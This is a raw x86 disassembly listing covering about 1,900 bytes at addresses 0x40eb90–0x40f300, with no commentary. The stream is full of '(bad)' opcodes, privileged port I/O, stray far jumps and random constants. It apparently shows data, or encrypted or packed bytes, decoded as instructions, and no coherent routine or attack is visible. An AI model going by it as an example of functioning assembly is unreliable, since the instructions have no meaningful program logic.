  40eb90:	cmp    bh,BYTE PTR [ebx]
  40eb92:	ret    0xf76f
  40eb95:	or     al,0xf2
  40eb97:	shl    BYTE PTR [esi-0x34],0x9e
  40eb9b:	add    cl,0xe3
  40eb9e:	xor    dh,al
  40eba0:	in     eax,0x38
  40eba2:	std    
  40eba3:	xor    ah,bl
  40eba5:	jecxz  0x40eb51
  40eba7:	sub    BYTE PTR [ebx+0x779d7766],ch
  40ebad:	xor    DWORD PTR [edx+ebx*2+0xa],esp
  40ebb1:	aaa    
  40ebb2:	jl     0x40ec0c
  40ebb4:	cwde   
  40ebb5:	dec    ecx
  40ebb6:	pop    esi
  40ebb7:	ret    0xffb7
  40ebba:	xor    cl,al
  40ebbc:	neg    bl
  40ebbe:	sub    DWORD PTR [ebp+ecx*2-0x43],esi
  40ebc2:	mov    WORD PTR [edx],gs
  40ebc4:	js     0x40ec2c
  40ebc6:	mov    ebp,0x12a90f39
  40ebcb:	add    BYTE PTR [ebp+0x4eeb21a1],0xd1
  40ebd2:	mov    ebx,0xbcf948b3
  40ebd7:	rcr    BYTE PTR [ebx],cl
  40ebd9:	push   ss
  40ebda:	enter  0xc26e,0x8
  40ebde:	mov    esp,0x6e14137e
  40ebe3:	mov    cl,0x29
  40ebe5:	xor    dh,BYTE PTR [ecx+0xb]
  40ebe8:	add    edi,edi
  40ebea:	mov    ecx,0x8f0634cd
  40ebef:	rol    BYTE PTR [ebx+0xee77c7d],cl
  40ebf5:	sub    eax,0xb512c3e3
  40ebfa:	or     dl,BYTE PTR [ebx+0x19]
  40ebfd:	jo     0x40ec0e
  40ebff:	mov    edx,0x2b273773
  40ec04:	adc    BYTE PTR [ebp-0x7c],dh
  40ec07:	popf   
  40ec08:	(bad)  
  40ec0a:	mov    dl,0x7a
  40ec0c:	sahf   
  40ec0d:	retf   
  40ec0e:	mov    eax,DWORD PTR [eax-0x310e1c09]
  40ec14:	cmp    al,0xa1
  40ec16:	mov    ss,WORD PTR [eax]
  40ec18:	push   esi
  40ec19:	xchg   bl,bh
  40ec1b:	in     eax,dx
  40ec1c:	inc    edx
  40ec1d:	inc    edi
  40ec1e:	mov    ebx,0xa6486e4
  40ec23:	out    0x7b,eax
  40ec25:	mov    WORD PTR [ecx+0x17],gs
  40ec28:	(bad)  
  40ec29:	jbe    0x40ec27
  40ec2b:	pop    ecx
  40ec2c:	fimul  WORD PTR [ecx+0x59]
  40ec2f:	int3   
  40ec30:	fcomp  QWORD PTR [ebx-0x1a]
  40ec33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec34:	mov    al,0x44
  40ec36:	mov    ds:0xad5b5934,al
  40ec3b:	xlat   BYTE PTR ds:[ebx]
  40ec3c:	retf   
  40ec3d:	in     eax,0x79
  40ec3f:	ret    
  40ec40:	nop
  40ec41:	xor    eax,0xc0d7d8d4
  40ec46:	mov    ah,0xdb
  40ec48:	pop    eax
  40ec49:	outs   dx,DWORD PTR ds:[esi]
  40ec4a:	fnstenv [edx+0x640f4fb1]
  40ec50:	dec    esp
  40ec51:	test   DWORD PTR ds:0x7232687,esi
  40ec57:	sub    ecx,DWORD PTR [ecx-0x93c8034]
  40ec5d:	and    DWORD PTR ds:0x184703a2,esi
  40ec63:	cmp    al,0x53
  40ec65:	cmp    ah,BYTE PTR [ebp+0x41c6513e]
  40ec6b:	sub    ah,BYTE PTR [ebx-0x7a]
  40ec6e:	mov    ebp,DWORD PTR [ebp*8+0x47982b9d]
  40ec75:	sub    eax,0x5516102c
  40ec7a:	dec    edx
  40ec7b:	dec    ebp
  40ec7c:	jo     0x40ebfe
  40ec7e:	fcom   DWORD PTR [esi-0x5215b030]
  40ec84:	shr    BYTE PTR [ebp-0x624df934],0xde
  40ec8b:	iret   
  40ec8c:	xchg   ebp,eax
  40ec8d:	sub    ah,bh
  40ec8f:	pop    ebp
  40ec90:	sbb    BYTE PTR [esi+0xd],0x1e
  40ec94:	dec    eax
  40ec95:	pop    ds
  40ec96:	fistp  DWORD PTR [edi-0x27d47f96]
  40ec9c:	das    
  40ec9d:	push   eax
  40ec9e:	fwait
  40ec9f:	(bad)  
  40eca0:	or     eax,0xbf9b6deb
  40eca5:	scas   al,BYTE PTR es:[edi]
  40eca6:	fs test eax,0xe6cca056
  40ecac:	iret   
  40ecad:	xchg   BYTE PTR [ebx+0xf],bh
  40ecb0:	mov    ch,0x3f
  40ecb2:	shl    DWORD PTR [eax],1
  40ecb4:	jmp    eax
  40ecb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb7:	xor    DWORD PTR [ebp+0x4c],0xba1dfc3e
  40ecbe:	add    eax,0x20fd4de5
  40ecc3:	jnp    0x40ec4f
  40ecc5:	xor    edx,ebp
  40ecc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecc8:	out    0xc0,eax
  40ecca:	cmp    al,0xbf
  40eccc:	mov    ah,0x27
  40ecce:	jle    0x40ed4c
  40ecd0:	jg     0x40ec8e
  40ecd2:	mov    ebx,0x9727944f
  40ecd7:	das    
  40ecd8:	xchg   edx,eax
  40ecd9:	xor    WORD PTR [edi],ax
  40ecdc:	xchg   edx,eax
  40ecdd:	les    edi,FWORD PTR fs:[ecx-0x60d284d4]
  40ece4:	fbld   TBYTE PTR [edi+0x6e]
  40ece7:	stos   BYTE PTR es:[edi],al
  40ece8:	sbb    bl,ch
  40ecea:	sub    cl,BYTE PTR [esi-0x13013733]
  40ecf0:	cld    
  40ecf1:	inc    ecx
  40ecf2:	ss xor al,0x52
  40ecf5:	(bad)  
  40ecf6:	retf   0xec06
  40ecf9:	and    ah,BYTE PTR [ebx-0x3b702b15]
  40ecff:	inc    edx
  40ed00:	cmp    al,0x8a
  40ed02:	daa    
  40ed03:	or     al,BYTE PTR [edi+edx*4+0x5d]
  40ed07:	mov    ecx,0x917749ab
  40ed0c:	and    DWORD PTR [edi-0x4486e2c6],edx
  40ed12:	into   
  40ed13:	inc    ebp
  40ed14:	sub    bh,dh
  40ed16:	xor    ecx,0x3a5fce02
  40ed1c:	pop    edi
  40ed1d:	iret   
  40ed1e:	ds (bad) 
  40ed20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed21:	shl    BYTE PTR [edx-0x70],1
  40ed24:	inc    esp
  40ed25:	int3   
  40ed26:	pop    ebx
  40ed27:	(bad)  
  40ed28:	mov    esp,0x9999e199
  40ed2d:	div    DWORD PTR [ebp-0x68]
  40ed30:	call   0x452024a2
  40ed35:	xor    BYTE PTR [ebp+eax*4-0x31],bh
  40ed39:	mov    WORD PTR [eax],?
  40ed3b:	inc    ecx
  40ed3c:	in     eax,dx
  40ed3d:	(bad)  
  40ed3f:	leave  
  40ed40:	clc    
  40ed41:	sub    DWORD PTR [edx-0x76],eax
  40ed44:	jmp    0xf7f1:0x4fa685cc
  40ed4b:	jmp    0x19d44ad2
  40ed50:	test   ecx,0x2a30fa9
  40ed56:	ja     0x40ecf9
  40ed58:	neg    DWORD PTR fs:[edi-0x1aa2a4ba]
  40ed5f:	pop    esi
  40ed60:	retf   
  40ed61:	xchg   esp,eax
  40ed62:	mov    eax,0xc6f1af7f
  40ed67:	into   
  40ed68:	mov    al,0x92
  40ed6a:	mov    cl,0xa1
  40ed6c:	add    al,0x47
  40ed6e:	mov    eax,ds:0x4659ee98
  40ed73:	push   ecx
  40ed74:	out    dx,al
  40ed75:	mov    ch,0x1e
  40ed77:	test   eax,0x5ea0f84c
  40ed7c:	(bad)
  40ed80:	pop    ss
  40ed81:	das    
  40ed82:	mov    bh,ah
  40ed84:	pop    ss
  40ed85:	jg     0x40ed75
  40ed87:	outs   dx,DWORD PTR ds:[esi]
  40ed88:	in     eax,0x89
  40ed8a:	test   eax,0x4ebdbb1c
  40ed8f:	imul   ebp,DWORD PTR [edi-0x17],0x63
  40ed93:	adc    ch,BYTE PTR [ecx-0x72f5cdf9]
  40ed99:	push   ebx
  40ed9a:	pop    edx
  40ed9b:	aaa    
  40ed9c:	test   BYTE PTR [esi+0x58a90bf2],ah
  40eda2:	dec    esp
  40eda3:	add    BYTE PTR [edx+0x1b],cl
  40eda6:	test   eax,0x4b5f035
  40edab:	ret    0x8524
  40edae:	and    dh,ch
  40edb0:	xchg   ecx,eax
  40edb1:	pop    esi
  40edb2:	adc    eax,0x6449c6df
  40edb7:	outs   dx,DWORD PTR ds:[esi]
  40edb8:	hlt    
  40edb9:	mov    dl,BYTE PTR [edi+0x6da5ffce]
  40edbf:	mov    dl,BYTE PTR [eax]
  40edc1:	sub    eax,0x2284bae9
  40edc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc7:	inc    ecx
  40edc8:	adc    eax,0xa35929c5
  40edcd:	mov    ah,0x82
  40edcf:	mov    BYTE PTR [eax-0x19],dl
  40edd2:	jns    0x40ed7d
  40edd4:	out    dx,eax
  40edd5:	mov    bh,0xfc
  40edd7:	aaa    
  40edd8:	mov    ebx,0x282b0912
  40eddd:	cwde   
  40edde:	and    BYTE PTR [edi],0x35
  40ede1:	push   esp
  40ede2:	dec    ebx
  40ede3:	fbld   TBYTE PTR [ecx-0x1ca157f]
  40ede9:	pop    edx
  40edea:	push   ss
  40edeb:	jns    0x40ee46
  40eded:	loope  0x40edac
  40edef:	mov    edx,fs
  40edf1:	or     DWORD PTR [edx+edx*4+0x64],ebp
  40edf5:	das    
  40edf6:	xor    BYTE PTR [ebx],ah
  40edf8:	sbb    DWORD PTR [ebx],edi
  40edfa:	mov    esp,0x835f9efa
  40edff:	dec    esi
  40ee00:	mov    dl,BYTE PTR [edx+0x2096857b]
  40ee06:	mov    cl,0x20
  40ee08:	test   eax,0x746ac323
  40ee0d:	loopne 0x40edee
  40ee0f:	js     0x40ed93
  40ee11:	in     al,dx
  40ee12:	sbb    al,BYTE PTR [ecx]
  40ee14:	mov    DWORD PTR [ebx],ebx
  40ee16:	rcl    BYTE PTR [ecx+0x7e],0x42
  40ee1a:	add    al,0x8f
  40ee1c:	mov    ebx,0x28f234e0
  40ee21:	inc    ebp
  40ee22:	cs or  al,0xe7
  40ee25:	jnp    0x40ede8
  40ee27:	dec    edi
  40ee28:	popf   
  40ee29:	jmp    0xc48:0x47ebc66b
  40ee30:	ret    
  40ee31:	fwait
  40ee32:	xchg   ebx,eax
  40ee33:	dec    eax
  40ee34:	cld    
  40ee35:	jp     0x40ee7c
  40ee37:	inc    ecx
  40ee38:	in     eax,0xa6
  40ee3a:	push   ebp
  40ee3b:	push   edi
  40ee3c:	sbb    eax,0x78673b32
  40ee41:	outs   dx,BYTE PTR ds:[esi]
  40ee42:	hlt    
  40ee43:	push   esp
  40ee44:	mov    ds:0x1b038c6b,eax
  40ee49:	fidivr WORD PTR [ebp-0x79997960]
  40ee4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee50:	fidiv  WORD PTR [eax+esi*1-0x1a]
  40ee54:	inc    edi
  40ee55:	cmp    al,0x85
  40ee57:	push   0x42
  40ee59:	pop    ebx
  40ee5a:	pop    edx
  40ee5b:	fst    st(7)
  40ee5d:	xchg   edi,esp
  40ee5f:	rcr    DWORD PTR [edi-0x1274c417],1
  40ee65:	cli    
  40ee66:	push   0xffffff80
  40ee68:	jmp    0xc7bb5b8e
  40ee6d:	jnp    0x40ee96
  40ee6f:	pop    esp
  40ee70:	mov    dl,0x72
  40ee72:	ds pop eax
  40ee74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee75:	inc    ebx
  40ee76:	sbb    BYTE PTR [esi+edi*2-0x43],ah
  40ee7a:	adc    eax,0x4ead3d4b
  40ee7f:	call   0x7d44697
  40ee84:	jne    0x40ee29
  40ee86:	adc    BYTE PTR [edi+0x51],al
  40ee89:	mov    ecx,0x1fef03e3
  40ee8e:	int3   
  40ee8f:	stc    
  40ee90:	ds movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee93:	cmp    al,0xb0
  40ee95:	and    eax,0xce206b7b
  40ee9a:	mov    esp,0x24431f
  40ee9f:	arpl   WORD PTR [esi],di
  40eea1:	(bad)  
  40eea2:	cmp    BYTE PTR [esi],cl
  40eea4:	push   ecx
  40eea5:	cs mov di,0xbb51
  40eeaa:	jnp    0x40ee3a
  40eeac:	pop    esi
  40eead:	ret    0xc994
  40eeb0:	mov    WORD PTR [esi+0x53],fs
  40eeb3:	test   DWORD PTR [ebx+eiz*4-0x6979ae0],esi
  40eeba:	daa    
  40eebb:	jp     0x40ef04
  40eebd:	ins    BYTE PTR es:[edi],dx
  40eebe:	not    BYTE PTR [edi]
  40eec0:	or     BYTE PTR cs:[edi],0xf6
  40eec4:	sub    BYTE PTR [esi+0x7f3f5ce4],cl
  40eeca:	loop   0x40ef29
  40eecc:	add    BYTE PTR [ebx+0x467eea7c],0xd8
  40eed3:	pop    ecx
  40eed4:	fistp  QWORD PTR [edi+0x6a]
  40eed7:	test   DWORD PTR [ecx],esp
  40eed9:	pop    es
  40eeda:	fs idiv BYTE PTR gs:[ebx-0x49]
  40eedf:	loopne 0x40ee75
  40eee1:	jns    0x40ee72
  40eee3:	in     al,dx
  40eee4:	sub    DWORD PTR [eax],ebp
  40eee6:	xchg   esp,eax
  40eee7:	sbb    al,BYTE PTR ds:0xf14bd93a
  40eeed:	add    al,0x9e
  40eeef:	dec    ebp
  40eef0:	jno    0x40eede
  40eef2:	sub    DWORD PTR [ebx*4+0xcc545f0],esp
  40eef9:	or     al,0x65
  40eefb:	xor    esi,DWORD PTR [edi+0x68]
  40eefe:	push   ss
  40eeff:	mov    ch,0x1f
  40ef01:	leave  
  40ef02:	cld    
  40ef03:	pop    esp
  40ef04:	lahf   
  40ef05:	push   esi
  40ef06:	sbb    ecx,esp
  40ef08:	add    al,BYTE PTR [ecx+0x1e6a6b18]
  40ef0e:	add    DWORD PTR [edi+esi*2+0x1758c917],esp
  40ef15:	stos   DWORD PTR es:[edi],eax
  40ef16:	ds enter 0x5cd,0xa1
  40ef1b:	cmc    
  40ef1c:	xor    al,0x23
  40ef1e:	sbb    al,0xd2
  40ef20:	mov    ecx,0x66f2bca1
  40ef25:	lock stc 
  40ef27:	xchg   edi,eax
  40ef28:	mov    ecx,0x5d7a6b9a
  40ef2d:	pop    ecx
  40ef2e:	mov    ebx,0x5abeb5d0
  40ef33:	std    
  40ef34:	stc    
  40ef35:	das    
  40ef36:	data16 aam 0xa4
  40ef39:	test   eax,0x1b7e60b9
  40ef3e:	hlt    
  40ef3f:	hlt    
  40ef40:	pop    ecx
  40ef41:	jae    0x40eecf
  40ef43:	or     al,BYTE PTR [ebp+0xcf0ec08]
  40ef49:	out    0x1,eax
  40ef4b:	sub    al,0x80
  40ef4d:	outs   dx,BYTE PTR ds:[esi]
  40ef4e:	push   esp
  40ef4f:	mov    ds:0xa7c5e807,eax
  40ef54:	je     0x40efc4
  40ef56:	jmp    0x40ef89
  40ef58:	stos   BYTE PTR es:[edi],al
  40ef59:	aad    0xc5
  40ef5b:	mov    ds:0xd031b1a0,eax
  40ef60:	cmp    DWORD PTR [ebp+0xe],0x7bcf9eab
  40ef67:	jo     0x40ef0d
  40ef69:	fsub   DWORD PTR [edx-0x7160ce6e]
  40ef6f:	ja     0x40efef
  40ef71:	xor    ecx,ecx
  40ef73:	les    ebx,FWORD PTR [edi+0x66]
  40ef76:	inc    edi
  40ef77:	mov    cl,0xa8
  40ef79:	or     eax,0x990b0542
  40ef7e:	pop    ecx
  40ef7f:	mov    eax,0x4b11be02
  40ef84:	cld    
  40ef85:	sub    ebp,ebp
  40ef87:	add    cl,ah
  40ef89:	arpl   WORD PTR [eax+0x247c846b],si
  40ef8f:	loope  0x40f00f
  40ef91:	and    BYTE PTR [ebx+0x59886e91],0xb2
  40ef98:	arpl   WORD PTR [ebp+0x2c],di
  40ef9b:	repnz fdiv DWORD PTR [esi+ecx*8]
  40ef9f:	nop
  40efa0:	adc    BYTE PTR [edi+0x49],0xee
  40efa4:	fdiv   st(6),st
  40efa6:	outs   dx,DWORD PTR ds:[esi]
  40efa7:	int3   
  40efa8:	sbb    al,0x0
  40efaa:	(bad)  
  40efab:	mov    edi,edi
  40efad:	mov    bh,0xa7
  40efaf:	cmp    al,0x24
  40efb1:	dec    edx
  40efb2:	aaa    
  40efb3:	fldenv [edi+0x9397943]
  40efb9:	or     BYTE PTR [ebx],dl
  40efbb:	xchg   ecx,eax
  40efbc:	cmp    DWORD PTR [edi+0x78e6b034],edi
  40efc2:	cmp    eax,0x89a0d5a4
  40efc7:	or     dh,BYTE PTR [ebx+0x49]
  40efca:	push   0xad8b2bd0
  40efcf:	push   es
  40efd0:	and    BYTE PTR [edx+0x75293b0a],dl
  40efd6:	sub    DWORD PTR [ebx],ebp
  40efd8:	ins    BYTE PTR es:[edi],dx
  40efd9:	or     eax,DWORD PTR [esi+0x1c]
  40efdc:	mov    dl,0x1c
  40efde:	(bad)  
  40efdf:	jl     0x40ef70
  40efe1:	push   0x5a
  40efe3:	xchg   edi,eax
  40efe4:	mov    esp,DWORD PTR [eax+0x521953cd]
  40efea:	pop    eax
  40efeb:	push   ds
  40efec:	outs   dx,DWORD PTR ds:[esi]
  40efed:	xor    DWORD PTR [eax-0xa],esp
  40eff0:	retf   
  40eff1:	retf   0xd76
  40eff4:	mul    BYTE PTR ds:0xbdc4f2aa
  40effa:	test   al,0x53
  40effc:	into   
  40effd:	je     0x40f016
  40efff:	cmp    dh,BYTE PTR [ebp+0x9]
  40f002:	cdq    
  40f003:	mov    dl,0xdb
  40f005:	(bad)  
  40f007:	add    al,bl
  40f009:	scas   al,BYTE PTR es:[edi]
  40f00a:	lahf   
  40f00b:	sbb    al,0xd7
  40f00d:	jno    0x40f04a
  40f00f:	cmp    al,0x5e
  40f011:	push   ss
  40f012:	push   0x34
  40f014:	rcl    bh,0x2c
  40f017:	dec    ecx
  40f018:	xchg   BYTE PTR [esp+edi*8],al
  40f01b:	dec    esp
  40f01c:	sub    dh,BYTE PTR [esi]
  40f01e:	mov    cl,0xea
  40f020:	stos   BYTE PTR es:[edi],al
  40f021:	iret   
  40f022:	or     al,0x5
  40f024:	push   ecx
  40f025:	dec    eax
  40f026:	sbb    al,0xb7
  40f028:	cmp    al,0x8c
  40f02a:	pop    esi
  40f02b:	lock mov esi,0x9a3f876f
  40f031:	inc    edi
  40f032:	pop    esp
  40f033:	jmp    0xbe6fb4e9
  40f038:	ds dec ebx
  40f03a:	push   esp
  40f03b:	xchg   BYTE PTR [eax-0x78f25106],dl
  40f041:	call   0x679f:0x94b2209d
  40f048:	addr16 sub ch,bh
  40f04b:	lods   eax,DWORD PTR ds:[esi]
  40f04c:	push   0x2
  40f04e:	inc    ebx
  40f04f:	and    ah,BYTE PTR [eax]
  40f051:	adc    eax,0x765033a4
  40f056:	mov    bh,0x66
  40f058:	jo     0x40eff3
  40f05a:	mov    eax,ds:0x5b571d9
  40f05f:	lea    esi,[ebx]
  40f061:	adc    BYTE PTR [edi],bh
  40f063:	nop
  40f064:	jno    0x40f0e3
  40f066:	(bad)  
  40f067:	mov    bh,0xc6
  40f069:	int3   
  40f06a:	fmul   DWORD PTR [ecx]
  40f06c:	outs   dx,BYTE PTR ds:[esi]
  40f06d:	push   esp
  40f06e:	mov    edi,0x7ab5bcc2
  40f073:	addr16 add al,0x12
  40f076:	pop    ebp
  40f077:	cmp    BYTE PTR [ebx+0x20edb420],0xf7
  40f07e:	sbb    eax,0x8532685e
  40f083:	je     0x40f05e
  40f085:	add    eax,0xbe10b4a6
  40f08a:	pop    ebx
  40f08b:	push   ebx
  40f08c:	xor    eax,0xcdc63d17
  40f091:	mov    dh,BYTE PTR [ecx+edi*2]
  40f094:	outs   dx,DWORD PTR ds:[esi]
  40f095:	pop    DWORD PTR [ebp-0x874e38d]
  40f09b:	(bad)  
  40f09d:	mov    dl,ch
  40f09f:	jmp    0xd8704d15
  40f0a4:	adc    BYTE PTR [eax+esi*2-0x49],ch
  40f0a8:	mov    dh,0x9f
  40f0aa:	das    
  40f0ab:	xchg   ecx,eax
  40f0ac:	repnz loope 0x40f05f
  40f0af:	ja     0x40f07f
  40f0b1:	sub    DWORD PTR [ebx+eax*4+0x70409367],ebx
  40f0b8:	jbe    0x40f07f
  40f0ba:	xchg   BYTE PTR ds:0x3f30c93f,ch
  40f0c0:	out    0xce,eax
  40f0c2:	add    esi,esp
  40f0c4:	mov    ds:0x837019f1,al
  40f0c9:	in     eax,0x9f
  40f0cb:	mov    bl,0x63
  40f0cd:	dec    ecx
  40f0ce:	ret    
  40f0cf:	jno    0x40f0a1
  40f0d1:	add    BYTE PTR [ebp+0x71],bl
  40f0d4:	jbe    0x40f14f
  40f0d6:	xor    al,0xe
  40f0d8:	sub    ah,cl
  40f0da:	cdq    
  40f0db:	jo     0x40f0d4
  40f0dd:	arpl   WORD PTR [esi+0x7f2c6f73],si
  40f0e3:	outs   dx,DWORD PTR ds:[esi]
  40f0e4:	arpl   WORD PTR [ecx+0x6d],bx
  40f0e7:	and    DWORD PTR [ebp+0x3],edx
  40f0ea:	pop    ecx
  40f0eb:	sub    bh,bl
  40f0ed:	sub    DWORD PTR [ecx+0x1f],ecx
  40f0f0:	inc    ecx
  40f0f1:	xor    al,0x1
  40f0f3:	repz cmp BYTE PTR [edi-0x79],0x36
  40f0f8:	mov    ch,0x66
  40f0fa:	(bad)  
  40f0fb:	xor    edi,DWORD PTR [eax]
  40f0fd:	pop    edi
  40f0fe:	sub    BYTE PTR [edx],ch
  40f100:	inc    edx
  40f101:	mov    cl,bl
  40f103:	mov    bl,0x84
  40f105:	inc    edi
  40f106:	cdq    
  40f107:	leave  
  40f108:	fsubr  QWORD PTR [eax+0x59162920]
  40f10e:	sahf   
  40f10f:	mov    ah,0xa2
  40f111:	push   eax
  40f112:	aas    
  40f113:	sar    BYTE PTR [edi],cl
  40f115:	ins    BYTE PTR es:[edi],dx
  40f116:	xchg   DWORD PTR [edx+0x59],ebx
  40f119:	push   esi
  40f11a:	imul   ebx,ebx,0x7c647b71
  40f120:	aam    0x18
  40f122:	in     eax,dx
  40f123:	bound  ebp,QWORD PTR [eax]
  40f125:	mov    ebx,fs
  40f127:	jns    0x40f16a
  40f129:	imul   edi,DWORD PTR [ebx+0x76ed9418],0xef5b3239
  40f133:	mov    ch,cl
  40f135:	mov    dh,0x4b
  40f137:	mov    eax,ds:0x873c6c51
  40f13c:	ret    
  40f13d:	iret   
  40f13e:	jo     0x40f135
  40f140:	mov    esi,0x9e2b2fd6
  40f145:	pop    bp
  40f147:	adc    eax,0x76b28dc8
  40f14c:	out    0x17,al
  40f14e:	cmp    eax,0x94febac2
  40f153:	mov    bh,al
  40f155:	js     0x40f138
  40f157:	push   eax
  40f158:	cmp    BYTE PTR [edi+0x722c6611],bh
  40f15e:	jg     0x40f142
  40f160:	pop    es
  40f161:	hlt    
  40f162:	mov    dl,0x75
  40f164:	clc    
  40f165:	add    al,0x4b
  40f167:	in     al,0x8e
  40f169:	inc    eax
  40f16a:	test   DWORD PTR [edi+0x29],esp
  40f16d:	retf   
  40f16e:	inc    edi
  40f16f:	pop    ecx
  40f170:	push   eax
  40f171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f172:	or     DWORD PTR [edi],ecx
  40f174:	add    ebp,DWORD PTR [edx]
  40f176:	iret   
  40f177:	hlt    
  40f178:	ins    DWORD PTR es:[edi],dx
  40f179:	cmp    eax,DWORD PTR [ebx+0x28]
  40f17c:	xor    eax,0x6635907d
  40f181:	and    bh,bh
  40f183:	js     0x40f15c
  40f185:	xchg   ebx,eax
  40f186:	push   ds
  40f187:	and    dh,dl
  40f189:	imul   ebp,ebx,0x4ed5944d
  40f18f:	aas    
  40f190:	jne    0x40f12c
  40f192:	mov    bh,0xea
  40f194:	add    eax,0x781be58e
  40f199:	mov    ebp,0x5a6586ad
  40f19e:	push   0xffffffc4
  40f1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1a1:	push   eax
  40f1a2:	pop    ss
  40f1a3:	mov    edx,0x54860d7b
  40f1a8:	pop    ebp
  40f1a9:	xchg   esp,eax
  40f1aa:	cmp    dl,cl
  40f1ac:	iret   
  40f1ad:	dec    DWORD PTR [esi+0xb916f1a]
  40f1b3:	jnp    0x40f205
  40f1b5:	pushf  
  40f1b6:	test   esp,0xf48118d3
  40f1bc:	sbb    al,0xc7
  40f1be:	or     BYTE PTR [ebx+edx*4-0x1877c67],dl
  40f1c5:	mov    edx,DWORD PTR [ebx]
  40f1c7:	outs   dx,DWORD PTR ds:[esi]
  40f1c8:	and    DWORD PTR [ecx+ebx*8-0x47f6326c],ebx
  40f1cf:	xchg   esp,eax
  40f1d0:	sub    edx,esp
  40f1d2:	ds pop edi
  40f1d4:	mov    DWORD PTR [edx-0x608e43b1],edx
  40f1da:	xchg   edi,eax
  40f1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1dc:	outs   dx,BYTE PTR ds:[esi]
  40f1dd:	adc    al,0xe6
  40f1df:	es jae 0x40f16b
  40f1e2:	jle    0x40f1fe
  40f1e4:	and    DWORD PTR [esp+edx*1],ecx
  40f1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e8:	in     al,0xd7
  40f1ea:	cmp    BYTE PTR [ecx+ecx*8+0x2a],bl
  40f1ee:	(bad)  
  40f1ef:	out    dx,eax
  40f1f0:	jecxz  0x40f21a
  40f1f2:	pusha  
  40f1f3:	into   
  40f1f4:	bound  esp,QWORD PTR [ebx-0x63507153]
  40f1fa:	mov    dh,0xf8
  40f1fc:	add    DWORD PTR [ebp+0x421ad74f],ebp
  40f202:	pushf  
  40f203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f204:	aaa    
  40f205:	ror    dh,cl
  40f207:	jle    0x40f1df
  40f209:	cmp    al,BYTE PTR [ebx+0xedcf609]
  40f20f:	and    al,0x1d
  40f211:	leave  
  40f212:	ds dec ecx
  40f214:	push   ss
  40f215:	sti    
  40f216:	adc    bl,BYTE PTR [edx-0x22]
  40f219:	push   esp
  40f21a:	adc    ebp,ecx
  40f21c:	fwait
  40f21d:	mov    al,ds:0x794fa798
  40f222:	add    al,bl
  40f224:	nop
  40f225:	arpl   WORD PTR [esi+0x4e],dx
  40f228:	adc    ebx,DWORD PTR [esp+eax*4]
  40f22b:	xchg   edi,eax
  40f22c:	js     0x40f2a4
  40f22e:	xchg   BYTE PTR [ecx+0x60],dh
  40f231:	and    edi,DWORD PTR [ebp+0x26e4d84c]
  40f237:	mov    al,bh
  40f239:	sbb    al,0x40
  40f23b:	fild   WORD PTR [ebx-0x2b]
  40f23e:	pusha  
  40f23f:	shl    DWORD PTR [esi-0x30],cl
  40f242:	xor    al,0xc8
  40f244:	retf   0xf791
  40f247:	mov    WORD PTR [edx-0x34],?
  40f24a:	mov    al,ds:0x8d8f1b0a
  40f24f:	pop    ds
  40f250:	(bad)  
  40f251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f252:	ins    DWORD PTR es:[edi],dx
  40f253:	ds jecxz 0x40f2af
  40f256:	add    al,0xb9
  40f258:	jbe    0x40f277
  40f25a:	cwde   
  40f25b:	pushf  
  40f25c:	or     eax,0x8d6d65ba
  40f261:	sbb    BYTE PTR [eax+0x2a],ch
  40f264:	mov    edx,0x738c6896
  40f269:	dec    eax
  40f26a:	std    
  40f26b:	sub    al,0x19
  40f26d:	popf   
  40f26e:	in     eax,dx
  40f26f:	pop    ebp
  40f270:	pop    ss
  40f271:	jnp    0x40f242
  40f273:	mov    al,0x85
  40f275:	data16 sub BYTE PTR [edi+esi*1-0x16],dh
  40f27a:	add    DWORD PTR [ecx+eiz*8-0x7305ecf3],edx
  40f281:	lds    esi,FWORD PTR [ebx-0x5a]
  40f284:	call   0x318:0xd3a937e3
  40f28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f28c:	mov    BYTE PTR [edx-0x55],dl
  40f28f:	mov    ds:0xec7893c,eax
  40f294:	in     al,0xd6
  40f296:	ins    BYTE PTR es:[edi],dx
  40f297:	pusha  
  40f298:	mov    edi,0x2f493392
  40f29d:	and    eax,0xe8596987
  40f2a2:	or     al,0x1c
  40f2a4:	cli    
  40f2a5:	jb     0x40f2af
  40f2a7:	mov    edx,0x35863028
  40f2ac:	ins    DWORD PTR es:[edi],dx
  40f2ad:	push   esi
  40f2ae:	xchg   DWORD PTR [eax-0x24],edx
  40f2b1:	call   0xe100:0xb1b4ab89
  40f2b8:	sub    DWORD PTR [esi+eax*4-0x468eea6f],esp
  40f2bf:	stc    
  40f2c0:	add    DWORD PTR [ebp+ecx*1-0x39],0x33696a9d
  40f2c8:	icebp  
  40f2c9:	lahf   
  40f2ca:	xlat   BYTE PTR ds:[ebx]
  40f2cb:	add    ebp,ebx
  40f2cd:	aaa    
  40f2ce:	cmp    DWORD PTR [ebx-0x3d],eax
  40f2d1:	jp     0x40f339
  40f2d3:	mov    ecx,gs
  40f2d5:	imul   DWORD PTR [ebp-0x2c77d9f4]
  40f2db:	inc    eax
  40f2dc:	push   es
  40f2dd:	adc    edx,DWORD PTR [esp+edi*2+0x419fee4f]
  40f2e4:	fwait
  40f2e5:	mov    ebp,0x9cd8a7c1
  40f2ea:	arpl   WORD PTR [eax+0x35],sp
  40f2ed:	or     BYTE PTR [esi+eax*4],ah
  40f2f0:	cmp    dh,BYTE PTR [eax]
  40f2f2:	outs   dx,BYTE PTR es:[esi]
  40f2f4:	repnz out dx,eax
  40f2f6:	adc    BYTE PTR [edi],bl
  40f2f8:	scas   al,BYTE PTR es:[edi]
  40f2f9:	imul   DWORD PTR [ecx-0x7e6ace2]
  40f2ff:	(bad)  
  40f300:	cwde   
